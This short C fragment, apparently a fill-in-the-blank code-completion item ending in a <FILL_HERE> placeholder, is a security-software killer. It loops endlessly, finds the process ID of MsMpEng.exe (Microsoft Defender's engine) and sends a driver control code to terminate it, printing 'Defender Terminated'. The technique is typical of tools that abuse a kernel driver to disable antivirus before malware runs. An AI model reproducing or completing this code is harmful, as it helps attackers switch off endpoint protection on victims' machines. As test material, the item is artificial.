while (0x1)
{
    if (input = GetPID(L"MsMpEng.exe"))
    {
        if (!DeviceIoControl(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &input, sizeof(input), output, outputSize, &bytesReturned, NULL))
        {
            printf("DeviceIoControl failed. Error: %X !!\n", GetLastError());
            CloseHandle(hDevice);
            return (-1);
        }
        if (once)
        {
            printf("Defender Terminated ..\n");
            once = 0;
        }
    }
    Sleep(700);
}

result = DeviceIoControl(<FILL_HERE>